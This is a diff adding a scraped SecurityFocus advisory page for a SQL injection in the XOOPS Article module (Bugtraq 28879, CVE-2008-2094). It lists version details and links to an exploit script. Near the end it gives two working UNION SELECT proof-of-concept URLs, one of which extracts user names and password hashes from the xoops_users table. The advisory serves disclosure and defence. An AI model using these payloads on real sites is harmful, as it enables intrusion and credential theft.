@@ -1,0 +1,101 @@
+#SpeeDr00t@Black Falcon<br>#bid28879<p><b><span style="font-size: 18pt;">XOOPS Article Module 'article.php' SQL Injection Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/28879/info">info</a><br><a href="http://www.securityfocus.com/bid/28879/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/28879/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/28879/solution">solution</a><br><a href="http://www.securityfocus.com/bid/28879/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				28879
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+				
+					CVE-2008-2094<br/>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Apr 21 2008 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Sep 01 2010 06:37PM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Cr@zy_King
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					Xoops Xoops 2.0.14 <br/>
+					
+				
+					Xoops Article  0<br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>#<a href="https://github.com/SpeeDr00t/speedr00t.github.com/blob/master/securityfocus/0x29000/28879/28879.py">#exploit_28879.py</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	Attackers can use a browser to exploit this issue.<br/><br/>The following proof-of-concept URIs and exploit are available: <br/><br/>http://www.example.com/modules/dictionary/article.php?id=3+union+select+1,2,3,4,5,6,AES_DECRYPT(AES_ENCRYPT(USER(),0x71),0x71),8,9,0,1,2,3,4,5,6,7,8,9,0/*<br/>http://www.example.com/article.php?id=3/**/UNION/**/SELECT/**/NULL,NULL,NULL,NULL,uid,uname,pass,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL/**/FROM/**/xoops_users/**/LIMIT/**/1,1/*<br/><br/>http://www.example.com/path/modules/articles/article.php?id=SQL
+	
+		<ul>
+<li><a href="/data/vulnerabilities/exploits/28879.py">/data/vulnerabilities/exploits/28879.py</a></li>
+</ul>
+</div>
